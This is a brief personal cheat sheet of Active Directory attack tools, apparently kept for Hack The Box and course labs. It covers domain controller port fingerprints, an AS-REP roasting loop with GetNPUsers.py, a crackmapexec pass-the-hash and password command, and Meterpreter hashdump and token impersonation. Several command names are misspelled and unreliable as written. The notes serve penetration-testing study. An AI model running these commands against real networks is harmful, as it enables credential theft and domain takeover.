# Tools

## Enumeration
### Recognizing Domain Controller
- 137 open
- 3268 and 3269 open
- LDAP: 389 and 636
- [[rpcclient]]

#### Try to get some user hashes
`for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done`

## ldapsearch
- nmapautomator.py provides command
- `-x -h "<domain>" -s base` | tee somefile

## Crackmapexec
 - Pass the hash / smb attack
 - Use with cracked password to find where you have access to
 - Can be used with hashes too
`crackmapexec smb 192.168.148.0/24 -u Administrator -p 'P@$$w0rd' -d MARVEL`

## PsExec
- msfconsole
- used to interact with host you have creds for

## Meterpreter
- Migrate into process
- hashdump only works in x64, like many other things

### Incognito
- `load incofnito`
- `token_list`
- `impoersonate_token MARVEL\Administrator` -> token exists til reboot
- Path to domain admin
- `rev2selv` -> get back

### Migrate
IMPORTANT: Use to migrate into process to get x64 shell

